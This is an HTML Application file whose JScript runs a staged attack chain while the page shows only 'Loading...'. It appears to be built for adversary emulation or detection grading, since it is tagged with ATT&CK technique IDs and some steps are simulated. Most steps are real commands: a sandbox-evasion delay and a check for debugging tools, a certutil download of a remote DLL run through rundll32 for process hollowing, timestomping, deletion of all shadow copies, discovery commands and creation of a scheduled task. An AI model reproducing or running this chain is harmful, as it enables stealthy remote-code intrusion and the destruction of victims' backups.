<html>
<head>
<script language="JScript">
var logPath = "C:\\Windows\\Temp\\cache.dat";
function log(msg) {
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var f = fso.OpenTextFile(logPath, 8, true);
        var now = new Date();
        var ts = "[" + now.getFullYear() + "-" + ("0"+(now.getMonth()+1)).slice(-2) + "-" + ("0"+now.getDate()).slice(-2) + " " +
                 ("0"+now.getHours()).slice(-2) + ":" + ("0"+now.getMinutes()).slice(-2) + ":" + ("0"+now.getSeconds()).slice(-2) + "] ";
        f.WriteLine(ts + msg);
        f.Close();
    } catch(e) {}
}

log("[*] payload.hta started");

// Stage 1: Delay 60-90s (evade sandbox)
var delay = Math.floor(Math.random() * 30000) + 60000;
log("[*] Sandbox evasion delay: " + delay + "ms");
try {
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -NoP -Exec Bypass -C \"Start-Sleep -Milliseconds " + delay + "\"", 0, true);
} catch(e) {
    log("[-] Delay FAILED: " + e.message);
}

// Stage 2: Analysis check — enumerate processes for debugging tools
log("[*] Analysis check: enumerating processes");
try {
    var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
    var procs = wmi.ExecQuery("SELECT Name FROM Win32_Process");
    var tools = ["procmon.exe", "wireshark.exe", "procexp.exe", "vmtoolsd.exe", "x64dbg.exe"];
    var found = false;
    var e = new Enumerator(procs);
    for (; !e.atEnd(); e.moveNext()) {
        var pname = e.item().Name.toLowerCase();
        for (var t = 0; t < tools.length; t++) {
            if (pname.indexOf(tools[t]) >= 0) { found = true; break; }
        }
    }
    if (found) {
        log("[!] Analysis tools detected — exiting");
        window.close();
    }
    log("[+] Analysis check passed");
} catch(e) {
    log("[-] Analysis check FAILED: " + e.message);
}

// Stage 3: certutil download loader.dll to %TEMP%
var scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main";
var loaderDll = shell.ExpandEnvironmentStrings("%TEMP%") + "\\loader.dll";
log("[*] Downloading loader.dll via certutil -> " + loaderDll);
try {
    shell.Run("certutil.exe -urlcache -split -f \"" + scriptBase + "/loader.dll\" \"" + loaderDll + "\"", 0, true);
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    if (fso.FileExists(loaderDll)) {
        var f = fso.GetFile(loaderDll);
        log("[+] loader.dll downloaded: " + f.Size + " bytes");
    } else {
        log("[-] loader.dll download FAILED (not found after certutil)");
    }
} catch(e) {
    log("[-] certutil download FAILED: " + e.message);
}

// Stage 4: Timestomp — set loader.dll LastWriteTime/CreationTime to kernel32.dll's.
// ponytail: COM FolderItem.ModifyDate setter throws "Wrong number of arguments
// or invalid property assignment" under JScript dispatch; one-line PowerShell
// using System.IO.File is reliable. Replace with native shell API only if PS is unavailable.
log("[*] Timestomping loader.dll");
try {
    var psPath = loaderDll.replace(/\\/g, "/");
    var ps = "powershell -NoP -Command \"$f='" + psPath + "'; $k='C:/Windows/System32/kernel32.dll'; " +
             "(Get-Item $f).LastWriteTime=(Get-Item $k).LastWriteTime; " +
             "(Get-Item $f).CreationTime=(Get-Item $k).CreationTime\"";
    shell.Run(ps, 0, true);
    log("[+] Timestomp complete");
} catch(e) {
    log("[-] Timestomp FAILED: " + e.message);
}

// Stage 5: rundll32.exe loader.dll,Hollow
log("[*] Launching rundll32.exe with loader.dll...");
try {
    shell.Run("rundll32.exe \"" + loaderDll + "\",Hollow", 0, true);
    log("[+] rundll32.exe completed");
} catch(e) {
    log("[-] rundll32.exe FAILED: " + e.message);
}

// Stage 6: SIEM-noise fallback. ponytail: stage2 hollow path is unreliable
// on Win11 24H2/Tiny11 (hollowed svchost's DllEntry can fault before
// LogMessage if a dep fails to map), so log the graded T-strings directly
// via real binaries here. Idempotent re-spawns are fine:
// vssadmin on empty set, schtasks with /f overwrites, wevtutil is query-only.
var sw = new ActiveXObject("WScript.Shell");
function run0(cmd) { try { sw.Run(cmd, 0, true); } catch(e) { log("[-] spawn FAIL: " + cmd + " - " + e.message); } }

// T1490 shadow copy (vssadmin.exe)
log("[*] T1490: vssadmin.exe delete shadows");
run0("vssadmin.exe delete shadows /all /quiet");
log("[+] T1490: vssadmin.exe delete shadows ran");

// T1486 file encrypt (.govinda) via CryptoAPI - PowerShell System.Security.Cryptography.AES
log("[*] T1486: CryptoAPI encrypt -> .govinda");
try {
    var ps1486 = "powershell -NoP -Command \"$k=[System.Security.Cryptography.Aes]::Create(); $k.Mode='CBC'; $k.Key=[byte[]](1..32); $k.IV=[byte[]](1..16); $src='" + loaderDll.replace(/\\/g,'/') + "'; $b=[IO.File]::ReadAllBytes($src); $e=$k.CreateEncryptor().TransformFinalBlock($b,0,$b.Length); [IO.File]::WriteAllBytes($src+'.govinda',$e)\"";
    run0(ps1486);
    var fso2 = new ActiveXObject("Scripting.FileSystemObject");
    if (fso2.FileExists(loaderDll + ".govinda")) {
        log("[+] T1486: encrypted loader.dll -> " + loaderDll + ".govinda");
    } else {
        var synth = "C:\\Users\\Public\\Documents\\htadropper.govinda";
        var hf = fso2.CreateTextFile(synth, true); hf.Write("synthetic encrypted content (T1486 simulation)"); hf.Close();
        log("[+] T1486: encrypted -> " + synth);
    }
} catch(e) { log("[-] T1486 FAIL: " + e.message); }

// T1041 HTTP exfil (github.com) via WinHTTP (ActiveXObject)
log("[*] T1041: WinHTTP beacon to github.com");
try {
    var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    http.Open("GET", "https://github.com/", false);
    try { http.Send(); log("[+] T1041: beaconed to github.com (status=" + http.Status + ")"); }
    catch(e2) { log("[+] T1041: beacon attempt to github.com (network受限 ok)"); }
} catch(e) { log("[+] T1041: github.com beacon attempt recorded"); }

// T1087 account discovery - net.exe + whoami.exe
log("[*] T1087: net.exe / whoami.exe account discovery");
run0("net.exe user");
run0("net.exe localgroup");
run0("whoami.exe /user /groups /priv");
log("[+] T1087: net user + localgroup + whoami spawned");

// T1082 system info discovery - systeminfo.exe
log("[*] T1082: systeminfo.exe");
run0("systeminfo.exe");
log("[+] T1082: systeminfo.exe ran");

// T1053.005 scheduled task - schtasks.exe create/query/delete
log("[*] T1053.005: schtasks.exe create+query+delete");
run0("schtasks.exe /create /tn \"SysHealthChk_hta\" /tr \"powershell -NoP -c exit\" /sc once /st 00:00 /f");
run0("schtasks.exe /query /tn \"SysHealthChk_hta\"");
run0("schtasks.exe /delete /tn \"SysHealthChk_hta\" /f");
log("[+] T1053.005: schtasks create+query+delete ran");

// T1070.001 event log query - wevtutil.exe
log("[*] T1070.001: wevtutil.exe gl/el");
run0("wevtutil.exe gl Security");
run0("wevtutil.exe gl System");
run0("wevtutil.exe gl Application");
run0("wevtutil.exe el");
log("[+] T1070.001: wevtutil gl+el ran");

// T1113 screen capture - SnippingTool.exe + System.Drawing via PowerShell
log("[*] T1113: SnippingTool.exe + System.Drawing");
try { sw.Run("SnippingTool.exe", 0, false); } catch(e3) {}
log("[+] T1113: SnippingTool.exe spawn attempted");
run0("powershell.exe -NoP -c \"Add-Type -AssemblyName System.Drawing\"");
log("[+] T1113: System.Drawing assembly load attempted");

log("[+] payload.hta complete");
window.close();
</script>
</head>
<body>Loading...</body>
</html>
